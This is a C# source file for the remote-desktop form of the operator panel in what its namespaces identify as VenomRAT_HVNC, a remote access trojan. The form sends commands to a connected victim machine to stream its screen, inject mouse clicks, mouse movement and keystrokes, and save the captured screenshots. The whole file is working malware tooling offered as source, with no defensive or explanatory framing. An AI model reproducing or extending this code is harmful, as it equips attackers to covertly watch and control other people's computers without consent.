using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using VenomRAT_HVNC.Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Properties;
using VenomRAT_HVNC.Server.Connection;

using VenomRAT_HVNC.Server.Properties;

using VenomRAT_HVNC.StreamLibrary;
using VenomRAT_HVNC.StreamLibrary.UnsafeCodecs;

namespace VenomRAT_HVNC.Server.Forms
{
    public partial class FormRemoteDesktop : Form
    {
        public Form1 F { get; set; }

        internal Clients ParentClient { get; set; }

        internal Clients Client { get; set; }

        public string FullPath { get; set; }

        public Image GetImage { get; set; }

        public FormRemoteDesktop()
        {
            this._keysPressed = new List<Keys>();
            this.InitializeComponent();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
                {
                    base.Close();
                }
            }
            catch
            {
                base.Close();
            }
        }

        private void FormRemoteDesktop_Load(object sender, EventArgs e)
        {
            try
            {
                this.button1.Tag = "stop";
            }
            catch
            {
            }
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            if (this.button1.Tag == "play")
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                msgPack.ForcePathObject("Option").AsString = "capture";
                msgPack.ForcePathObject("Quality").AsInteger = (long)Convert.ToInt32(this.numericUpDown1.Value.ToString());
                msgPack.ForcePathObject("Screen").AsInteger = (long)Convert.ToInt32(this.numericUpDown2.Value.ToString());
                this.decoder = new UnsafeStreamCodec(Convert.ToInt32(this.numericUpDown1.Value), true);
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                this.numericUpDown1.Enabled = false;
                this.numericUpDown2.Enabled = false;
                this.btnSave.Enabled = true;
                this.btnMouse.Enabled = true;
                this.button1.Tag = "stop";
                this.button1.BackgroundImage = Resources.stop__1_;
                return;
            }
            this.button1.Tag = "play";
            try
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                msgPack2.ForcePathObject("Option").AsString = "stop";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
            }
            catch
            {
            }
            this.numericUpDown1.Enabled = true;
            this.numericUpDown2.Enabled = true;
            this.btnSave.Enabled = false;
            this.btnMouse.Enabled = false;
            this.button1.BackgroundImage = Resources.play_button;
        }

        private void BtnSave_Click(object sender, EventArgs e)
        {
            if (this.button1.Tag == "stop")
            {
                if (this.timerSave.Enabled)
                {
                    this.timerSave.Stop();
                    this.btnSave.BackgroundImage = Resources.save_image;
                    return;
                }
                this.timerSave.Start();
                this.btnSave.BackgroundImage = Resources.save_image2;
                try
                {
                    if (!Directory.Exists(this.FullPath))
                    {
                        Directory.CreateDirectory(this.FullPath);
                    }
                    Process.Start(this.FullPath);
                }
                catch
                {
                }
            }
        }

        private void TimerSave_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Directory.Exists(this.FullPath))
                {
                    Directory.CreateDirectory(this.FullPath);
                }
                Encoder quality = Encoder.Quality;
                EncoderParameters encoderParameters = new EncoderParameters(1);
                EncoderParameter encoderParameter = new EncoderParameter(quality, 50L);
                encoderParameters.Param[0] = encoderParameter;
                ImageCodecInfo encoder = this.GetEncoder(ImageFormat.Jpeg);
                this.pictureBox1.Image.Save(this.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", encoder, encoderParameters);
                if (encoderParameters != null)
                {
                    encoderParameters.Dispose();
                }
                if (encoderParameter != null)
                {
                    encoderParameter.Dispose();
                }
            }
            catch
            {
            }
        }

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo imageCodecInfo in imageDecoders)
            {
                if (imageCodecInfo.FormatID == format.Guid)
                {
                    return imageCodecInfo;
                }
            }
            return null;
        }

        private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            try
            {
                if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
                {
                    Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
                    int num = 0;
                    if (e.Button == MouseButtons.Left)
                    {
                        num = 2;
                    }
                    if (e.Button == MouseButtons.Right)
                    {
                        num = 8;
                    }
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                    msgPack.ForcePathObject("Option").AsString = "mouseClick";
                    msgPack.ForcePathObject("X").AsInteger = (long)point.X;
                    msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
                    msgPack.ForcePathObject("Button").AsInteger = (long)num;
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }

        private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            try
            {
                if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
                {
                    Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
                    int num = 0;
                    if (e.Button == MouseButtons.Left)
                    {
                        num = 4;
                    }
                    if (e.Button == MouseButtons.Right)
                    {
                        num = 16;
                    }
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                    msgPack.ForcePathObject("Option").AsString = "mouseClick";
                    msgPack.ForcePathObject("X").AsInteger = (long)point.X;
                    msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
                    msgPack.ForcePathObject("Button").AsInteger = (long)num;
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            try
            {
                if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
                {
                    Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                    msgPack.ForcePathObject("Option").AsString = "mouseMove";
                    msgPack.ForcePathObject("X").AsInteger = (long)point.X;
                    msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            if (this.isMouse)
            {
                this.isMouse = false;
                this.btnMouse.BackgroundImage = Resources.mouse;
            }
            else
            {
                this.isMouse = true;
                this.btnMouse.BackgroundImage = Resources.mouse_enable;
            }
            this.pictureBox1.Focus();
        }

        private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                Image getImage = this.GetImage;
                if (getImage != null)
                {
                    getImage.Dispose();
                }
                ThreadPool.QueueUserWorkItem(delegate (object o)
                {
                    Clients client = this.Client;
                    if (client == null)
                    {
                        return;
                    }
                    client.Disconnected();
                });
            }
            catch
            {
            }
        }

        private void btnKeyboard_Click(object sender, EventArgs e)
        {
            if (this.isKeyboard)
            {
                this.isKeyboard = false;
                this.btnKeyboard.BackgroundImage = Resources.keyboard;
            }
            else
            {
                this.isKeyboard = true;
                this.btnKeyboard.BackgroundImage = Resources.keyboard_on;
            }
            this.pictureBox1.Focus();
        }

        private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
        {
            if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isKeyboard)
            {
                if (!this.IsLockKey(e.KeyCode))
                {
                    e.Handled = true;
                }
                if (this._keysPressed.Contains(e.KeyCode))
                {
                    return;
                }
                this._keysPressed.Add(e.KeyCode);
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                msgPack.ForcePathObject("Option").AsString = "keyboardClick";
                msgPack.ForcePathObject("key").AsInteger = (long)Convert.ToInt32(e.KeyCode);
                msgPack.ForcePathObject("keyIsDown").SetAsBoolean(true);
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
        {
            if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && base.ContainsFocus && this.isKeyboard)
            {
                if (!this.IsLockKey(e.KeyCode))
                {
                    e.Handled = true;
                }
                this._keysPressed.Remove(e.KeyCode);
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                msgPack.ForcePathObject("Option").AsString = "keyboardClick";
                msgPack.ForcePathObject("key").AsInteger = (long)Convert.ToInt32(e.KeyCode);
                msgPack.ForcePathObject("keyIsDown").SetAsBoolean(false);
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        private bool IsLockKey(Keys key)
        {
            return (key & Keys.Capital) == Keys.Capital || (key & Keys.NumLock) == Keys.NumLock || (key & Keys.Scroll) == Keys.Scroll;
        }

        public int FPS;

        public Stopwatch sw = Stopwatch.StartNew();

        public IUnsafeCodec decoder = new UnsafeStreamCodec(60, true);

        public Size rdSize;

        private bool isMouse;

        private bool isKeyboard;

        public object syncPicbox = new object();

        private readonly List<Keys> _keysPressed;
    }
}
